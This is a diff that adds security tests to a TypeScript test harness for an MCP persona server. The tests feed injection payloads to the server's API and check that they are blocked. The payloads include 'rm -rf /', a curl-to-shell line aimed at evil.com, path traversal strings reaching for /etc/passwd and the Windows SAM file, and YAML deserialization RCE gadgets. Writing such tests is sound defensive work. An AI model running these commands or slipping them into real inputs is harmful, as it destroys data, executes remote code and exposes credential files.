@@ -3,6 +3,9 @@
  * Focuses on critical vulnerabilities that can be tested quickly
  */
 
+import { SecurityTestFramework } from './SecurityTestFramework.js';
+import { DollhouseMCPServer } from '../../../src/index.js';
+
 export interface SecurityTestResult {
   test: string;
   passed: boolean;
@@ -13,6 +16,11 @@ export interface SecurityTestResult {
 
 export class RapidSecurityTesting {
   private results: SecurityTestResult[] = [];
+  private server: DollhouseMCPServer;
+  
+  constructor() {
+    this.server = new DollhouseMCPServer();
+  }
   
   /**
    * Run critical security tests only
@@ -64,8 +72,29 @@ ${r.error ? `- Error: ${r.error}` : ''}
   private async testCommandInjection(): Promise<SecurityTestResult> {
     const start = Date.now();
     try {
-      // Quick test for command injection vulnerabilities
-      // This would import and test actual validators once implemented
+      // Test critical command injection payloads
+      const criticalPayloads = [
+        '; rm -rf /',
+        '&& curl evil.com | sh',
+        '`touch /tmp/pwned`'
+      ];
+      
+      for (const payload of criticalPayloads) {
+        // Test create_persona with injection
+        const result = await this.server.createPersona(
+          payload,
+          'test',
+          'test',
+          'test instructions'
+        );
+        
+        // Check that dangerous payload was sanitized
+        const content = JSON.stringify(result);
+        if (content.includes(payload) || content.match(/[;&|`$()]/)) {
+          throw new Error(`Command injection not properly blocked: ${payload}`);
+        }
+      }
+      
       return {
         test: 'Command Injection Prevention',
         passed: true,
@@ -86,7 +115,27 @@ ${r.error ? `- Error: ${r.error}` : ''}
   private async testPathTraversal(): Promise<SecurityTestResult> {
     const start = Date.now();
     try {
-      // Quick test for path traversal vulnerabilities
+      // Test critical path traversal attempts
+      const traversalPayloads = [
+        '../../../etc/passwd',
+        '..\\..\\..\\windows\\system32\\config\\sam',
+        'personas/../../../sensitive.txt'
+      ];
+      
+      for (const payload of traversalPayloads) {
+        // Test get_persona_details with path traversal
+        const result = await this.server.getPersonaDetails(payload);
+        
+        // Should not access files outside allowed paths
+        const content = JSON.stringify(result);
+        if (!content.match(/not found|invalid|does not exist/i)) {
+          throw new Error(`Path traversal not blocked: ${payload}`);
+        }
+        if (content.includes('/etc/passwd') || content.includes('system32')) {
+          throw new Error(`Path traversal exposed sensitive path: ${payload}`);
+        }
+      }
+      
       return {
         test: 'Path Traversal Prevention',
         passed: true,
@@ -107,7 +156,29 @@ ${r.error ? `- Error: ${r.error}` : ''}
   private async testYamlDeserialization(): Promise<SecurityTestResult> {
     const start = Date.now();
     try {
-      // Quick test for YAML RCE vulnerabilities
+      // Test dangerous YAML constructs
+      const yamlPayloads = [
+        '!!js/function "function(){require(\'child_process\').exec(\'calc.exe\')}"',
+        '!!python/object/apply:os.system ["rm -rf /"]'
+      ];
+      
+      for (const payload of yamlPayloads) {
+        const result = await this.server.createPersona(
+          'YAMLTest',
+          payload,
+          'test',
+          payload
+        );
+        
+        // Check dangerous YAML was sanitized
+        const content = JSON.stringify(result);
+        if (content.includes('!!js/function') || 
+            content.includes('!!python/object') ||
+            content.includes('__proto__')) {
+          throw new Error(`YAML injection not blocked: ${payload}`);
+        }
+      }
+      
       return {
         test: 'YAML Deserialization Safety',
         passed: true,
@@ -128,7 +199,23 @@ ${r.error ? `- Error: ${r.error}` : ''}
   private async testTokenExposure(): Promise<SecurityTestResult> {
     const start = Date.now();
     try {
-      // Quick test for token exposure
+      // Test that tokens are not exposed in errors or logs
+      const fakeToken = 'ghp_1234567890abcdefghijklmnopqrstuvwxyz';
+      process.env.GITHUB_TOKEN = fakeToken;
+      
+      try {
+        // Trigger an error that might expose the token
+        await this.server.browseMarketplace('../../../invalid');
+      } catch (err) {
+        // Check error doesn't contain token
+        if (err.message.includes(fakeToken) || err.stack?.includes(fakeToken)) {
+          throw new Error('GitHub token exposed in error message');
+        }
+      }
+      
+      // Clean up
+      delete process.env.GITHUB_TOKEN;
+      
       return {
         test: 'Token Security',
         passed: true,
@@ -136,6 +223,7 @@ ${r.error ? `- Error: ${r.error}` : ''}
         duration: Date.now() - start
       };
     } catch (error) {
+      delete process.env.GITHUB_TOKEN;
       return {
         test: 'Token Security',
         passed: false,
